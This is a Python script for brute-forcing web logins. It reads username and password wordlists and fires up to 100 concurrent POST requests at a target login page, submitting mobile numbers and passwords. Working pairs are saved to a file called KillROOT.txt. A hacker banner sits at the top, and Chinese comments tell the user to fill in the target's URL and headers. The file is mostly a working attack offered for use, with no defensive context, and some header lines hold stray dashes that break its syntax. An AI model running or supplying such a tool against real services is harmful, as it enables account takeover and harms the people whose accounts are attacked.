import aiohttp
import asyncio
import time
from colorama import Fore, Style

target_url = ""  # 这里填写URL,填写到登陆页面
username_file = ""  # 筛选出来的可用用户名字典
password_file = ""  # 密码字典
result_file = "KillROOT.txt"
max_concurrency = 100
max_retries = 5
retry_delay = 5

BLUE = Fore.BLUE
RED = Fore.RED
ENDC = Style.RESET_ALL

banner = r"""
   _____   ____  __.  ._.  __________                                               .___
  /  _  \ |    |/ _|  | |  \______   \_____    ______ ________  _  _____________  __| _/
 /  /_\  \|      <    |_|   |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ |
/    |    \    |  \   |-|   |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ |
\____|__  /____|__ \  | |   |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ |
|       \/        \/  |_|                  \/     \/     \/                          \/ Username + $Password组合
|__Ak     |__手术刀
|__7Bash  |__ICE
"""

print(f"{BLUE}{banner}{ENDC}")


def save_successful_login(username, password):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    with open(result_file, "a") as file:
        file.write(f"{username} {password} {target_url} {timestamp}\n")


async def hydra_brute_force(username, password, session):
    headers = {
        "Host": "", ----------------------  # POST请求都不懂直接重开
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "", -------------------  # POST请求都不懂直接重开
        "Referer": "", -------------------  # POST请求都不懂直接重开
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers"
    }

    payload = {
        "mobile": username,
        "password": password,
        "data_type": "mobile"
    }

    retries = 0
    while retries < max_retries:
        try:
            async with session.post(target_url, data=payload, headers=headers) as response:
                if response.status == 200:
                    json_data = await response.json()
                    if "status" in json_data and json_data["status"] == 1:
                        save_successful_login(username, password)
                        print(f"{RED}|__{username} {password}{ENDC}")
                    return
        except aiohttp.ClientError:
            print(f"\nError occurred for username: {username}")
            print("Connection error occurred. Retrying...")
            retries += 1
            await asyncio.sleep(retry_delay)

    print(f"\nMax retries exceeded for username: {username}. Skipping...")
    print(f"|_", end="", flush=True)


async def process_username_password(username, passwords, session):
    for password in passwords:
        await hydra_brute_force(username, password, session)
        await asyncio.sleep(0.1)


async def main():
    usernames = []
    with open(username_file, "r") as file:
        for line in file:
            username = line.strip()
            if username.isdigit():
                usernames.append(username)

    async with aiohttp.ClientSession() as session:
        sem = asyncio.Semaphore(max_concurrency)

        async def process_username(username):
            async with sem:
                with open(password_file, "r") as file:
                    passwords = file.readlines()
                    passwords = [p.strip() for p in passwords]

                await process_username_password(username, passwords, session)

        tasks = [process_username(username) for username in usernames]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()
